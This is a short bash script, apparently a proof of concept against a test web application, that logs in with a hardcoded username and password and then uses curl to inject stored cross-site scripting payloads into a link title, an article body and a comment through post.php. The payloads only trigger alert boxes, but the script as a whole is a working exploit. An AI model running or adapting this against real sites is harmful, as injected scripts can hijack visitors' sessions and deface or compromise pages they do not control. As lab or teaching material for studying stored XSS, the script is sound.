#!/bin/bash
IP="$1";
PORT="$2";

echo "Logging in as Alice";
curl -c cookies.txt --data "username=alice&password=passw0rd&form=login&submit=Login" "$IP:$PORT/post.php";

echo "Writing stored XSS attack to title of a new link post";
curl -b cookies.txt --data "title=%3Cscript%3Ewindow.alert(%27link title XSS%27)%3B%3C%2Fscript%3E&content=cont&type=2&form=content&submit=Post" "$IP:$PORT/post.php";

echo "Writing stored XSS attack to content of a new article post";
curl -b cookies.txt --data "title=StoredXSSContent&content=%3Cscript%3Ewindow.alert(%27article content XSS%27)%3B%3C%2Fscript%3E&type=1&form=content&submit=Post" "$IP:$PORT/post.php";

echo "Writing stored XSS attack to comment on first post";
curl -b cookies.txt --data "comment=%3Cscript%3Ewindow.alert(%27comment XSS%27)%3B%3C%2Fscript%3E&form=comment&parent=1&uid=7&submit=Post" "$IP:$PORT/post.php";

curl -b cookies.txt "$IP:$PORT/index.php";

echo "========================";
echo "Stored XSS done";
echo "Link title, article content, first post comment exploited";
echo "========================";
